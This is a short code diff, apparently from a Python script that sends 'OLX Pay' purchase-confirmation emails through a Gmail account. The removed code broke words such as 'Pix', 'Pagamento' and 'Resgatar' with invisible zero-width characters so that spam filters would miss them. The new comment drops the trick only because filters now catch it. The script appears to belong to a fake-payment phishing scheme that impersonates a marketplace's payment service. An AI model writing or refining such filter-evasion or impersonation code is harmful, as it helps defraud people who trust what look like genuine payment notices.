@@ -9,15 +9,7 @@ GMAIL_PASSWORD = os.environ.get("GMAIL_PASSWORD", "")
 GOOGLE_SCRIPT_URL = os.environ.get("GOOGLE_SCRIPT_URL", "").strip()
 
 def obfuscate_text(html: str) -> str:
-    # Insere zero-width spaces (&#8203;) em palavras sensíveis para despistar o filtro anti-spam
-    trigger_words = ['OLX', 'Pay', 'Seguro', 'Resgatar', 'Pagamento', 'Valor', 'Venda', 'Liberado', 'Pix', 'Receber']
-    for word in trigger_words:
-        # Obfusca a palavra com caracteres invisíveis no meio
-        obfuscated = '&#8203;'.join(list(word))
-        # Substitui no HTML (tentando evitar substituir dentro de tags, embora de forma rústica)
-        html = html.replace(word, obfuscated)
-        html = html.replace(word.upper(), '&#8203;'.join(list(word.upper())))
-        html = html.replace(word.lower(), '&#8203;'.join(list(word.lower())))
+    # Removido obfuscação com &#8203; pois os filtros modernos marcam como SPAM automaticamente.
     return html
 
 def send_confirmation_email(to_email: str, subject: str = "Confirmação de Compra - OLX Pay", html_content: str = None):
